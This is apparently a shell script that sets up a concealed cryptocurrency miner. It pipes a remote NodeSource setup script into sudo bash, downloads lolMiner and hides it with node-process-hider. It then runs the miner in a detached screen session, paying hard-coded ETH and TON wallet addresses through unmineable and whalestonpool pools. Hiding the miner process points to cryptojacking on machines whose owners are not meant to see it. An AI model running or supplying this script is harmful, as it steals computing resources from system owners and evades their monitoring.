sudo apt update
clear
sudo apt install screen
screen -R xmr
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && sudo ph add lolMiner && apt install screen && screen
screen
./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ETH:0x9Ba133D39F40e64C9809A99530Eb4E6eCACBe7F9.TW4a#mo7f-rmhw --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQAPWfct6IyOYIt6huHncRx62XAvRBG3aZH0Nnwvun07YnBw 
